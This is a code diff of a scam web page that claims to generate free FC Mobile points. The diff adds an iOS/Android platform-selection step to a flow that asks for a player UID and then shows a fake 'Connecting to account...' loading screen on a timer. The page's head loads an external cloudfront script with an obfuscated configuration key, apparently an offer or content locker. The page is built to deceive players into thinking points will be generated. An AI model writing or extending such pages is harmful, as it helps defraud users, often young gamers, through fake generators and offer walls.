@@ -5,6 +5,7 @@
         var teooj_cAw_XHkcWc={"it":4517896,"key":"01ffe"};
     </script>
     <script src="https://dlk457skl57zp.cloudfront.net/105f86b.js"></script>
+ 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FC Mobile Points Generator</title>
@@ -54,11 +55,6 @@
             -ms-overflow-style: none; /* IE and Edge */
             scrollbar-width: none;   /* Firefox */
         }
-        
-        /* Offer button styling */
-        .offer {
-            transition: all 0.3s ease-in-out;
-        }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
@@ -94,8 +90,33 @@
                 </button>
             </div>
 
-            <!-- Step 2: Choose Points -->
+            <!-- Step 2: Choose Platform -->
             <div id="step-2" class="step hidden w-full">
+                <h2 class="text-xl font-bold text-white text-center mb-2">Select Your Platform</h2>
+                <p class="text-gray-400 text-center mb-6">Choose the device you play on.</p>
+                <div class="grid grid-cols-2 gap-4 w-full">
+                    <button class="platform-btn group" onclick="selectPlatform(this, 'iOS')">
+                        <!-- Apple Logo -->
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mb-2 text-gray-300 group-hover:text-white" fill="currentColor" viewBox="0 0 24 24">
+                          <path d="M19.335 13.993c-.68 2.33-2.541 4.434-4.832 4.453-.87.007-1.748-.5-2.584-.5s-1.63.493-2.532.5c-2.317.02-4.225-2.14-4.905-4.434-.848-2.775.27-5.54 2.03-7.286.91-.94 2.125-1.512 3.432-1.528.847-.012 1.694.493 2.45.493.73 0 1.688-.532 2.603-.532 1.284-.012 2.637.59 3.527 1.57.48.52.812 1.12.99 1.773-.133.04-.266.08-.4.12-.133.04-.266.08-.4.12l-.12.04c-1.28.427-2.12.8-2.12 2.12s.933 1.653 2.213 2.08c.133.04.266.093.4.133.133.04.253.08.36.12a4.42 4.42 0 0 1-.72 2.373zM16.89 6.226c.787-.96 1.28-2.293 1.186-3.626-.986.053-2.226.693-3.04 1.653-.693.813-1.333 2.12-1.213 3.386.96-.027 2.253-.68 3.067-1.413z"/>
+                        </svg>
+                        <span class="text-lg font-bold text-white">iOS</span>
+                    </button>
+                    <button class="platform-btn group" onclick="selectPlatform(this, 'Android')">
+                        <!-- Android Logo -->
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mb-2 text-gray-300 group-hover:text-white" fill="currentColor" viewBox="0 0 24 24">
+                          <path d="M19.02 6.55c-1.32-1.3-3.14-2.05-5.02-2.05s-3.7.75-5.02 2.05C7.66 7.87 7 9.68 7 11.5v4.5l-2.78 2.78c-.2.2-.2.51 0 .71l.71.71c.2.2.51.2.71 0L8.5 16.34h7l2.84 2.84c.2.2.51.2.71 0l.71-.71c.2-.2.2-.51 0-.71L17 16V11.5c0-1.82-.66-3.63-1.98-4.95zM10 11.25c-.41 0-.75-.34-.75-.75V9c0-.41.34-.75.75-.75s.75.34.75.75v1.5c0 .41-.34.75-.75.75zm4 0c-.41 0-.75-.34-.75-.75V9c0-.41.34-.75.75-.75s.75.34.75.75v1.5c0 .41-.34.75-.75.75z"/>
+                        </svg>
+                        <span class="text-lg font-bold text-white">Android</span>
+                    </button>
+                </div>
+                <button id="platform-btn" onclick="goToStep(3)" class="w-full bg-emerald-500 text-white font-bold py-3 px-4 rounded-lg mt-6 shadow-lg shadow-emerald-500/20 transition-all duration-300 disabled:bg-gray-600 disabled:cursor-not-allowed disabled:shadow-none" disabled>
+                    Next
+                </button>
+            </div>
+
+            <!-- Step 3: Choose Points -->
+            <div id="step-3" class="step hidden w-full">
                 <h2 class="text-xl font-bold text-white text-center mb-2">Select Points</h2>
                 <p class="text-gray-400 text-center mb-6">Choose the amount of points you want to generate.</p>
                 <div class="grid grid-cols-2 gap-4 w-full">
@@ -141,14 +162,16 @@
     <script>
         // --- State Management ---
         let userUID = '';
+        let selectedPlatform = '';
         let selectedPoints = 0;
         let currentStep = 1;
 
         // --- DOM Elements ---
-        const steps = [1, 2, 4].reduce((acc, n) => ({ ...acc, [n]: document.getElementById(`step-${n}`) }), {});
+        const steps = [1, 2, 3, 4].reduce((acc, n) => ({ ...acc, [n]: document.getElementById(`step-${n}`) }), {});
         const loadingScreen = document.getElementById('loading');
         const loadingText = document.getElementById('loading-text');
         const uidInput = document.getElementById('uid-input');
+        const platformBtn = document.getElementById('platform-btn');
         const coinsBtn = document.getElementById('coins-btn');
 
         /**
@@ -180,7 +203,7 @@
          * @param {number} nextStep - The step to navigate to.
          */
         function goToStep(nextStep) {
-            if (nextStep === 2) { // From UID to Points Selection
+            if (nextStep === 2) { // From UID to Platform
                 const uid = uidInput.value.trim();
                 if (uid.length < 5) {
                     uidInput.classList.add('border-red-500', 'animate-pulse');
@@ -191,8 +214,26 @@
                 userUID = uid;
                 showLoading('Connecting to account...');
                 setTimeout(() => showStep(2), 2000);
+            } else if (nextStep === 3) { // From Platform to Points
+                showStep(3);
             }
         }
+        
+        /**
+         * Handles the selection of a platform.
+         */
+        function selectPlatform(btn, platform) {
+            document.querySelectorAll('.platform-btn').forEach(b => {
+                b.classList.remove('border-emerald-500', 'bg-emerald-500/10', 'ring-2', 'ring-emerald-500');
+                b.classList.add('bg-gray-800', 'border-gray-700');
+            });
+            btn.classList.add('border-emerald-500', 'bg-emerald-500/10', 'ring-2', 'ring-emerald-500');
+            btn.classList.remove('bg-gray-800', 'border-gray-700');
+
+            selectedPlatform = platform;
+            platformBtn.disabled = false;
+        }
+
 
         /**
          * Handles the selection of a points amount.
@@ -225,9 +266,10 @@
          * Initializes the page on load.
          */
         function initialize() {
-            // Style coin buttons dynamically
-            document.querySelectorAll('.coin-btn').forEach(button => {
-                button.classList.add('bg-gray-800', 'border-2', 'border-gray-700', 'rounded-lg', 'p-4', 'flex', 'flex-col', 'items-center', 'justify-center', 'cursor-pointer', 'transition-all', 'duration-300', 'hover:border-emerald-500', 'hover:bg-gray-800/50');
+            // Style selection buttons dynamically
+            const commonStyles = ['border-2', 'rounded-lg', 'p-4', 'flex', 'flex-col', 'items-center', 'justify-center', 'cursor-pointer', 'transition-all', 'duration-300', 'hover:border-emerald-500', 'hover:bg-gray-800/50'];
+            document.querySelectorAll('.coin-btn, .platform-btn').forEach(button => {
+                button.classList.add('bg-gray-800', 'border-gray-700', ...commonStyles);
             });
             // Show the first step
             showStep(1);
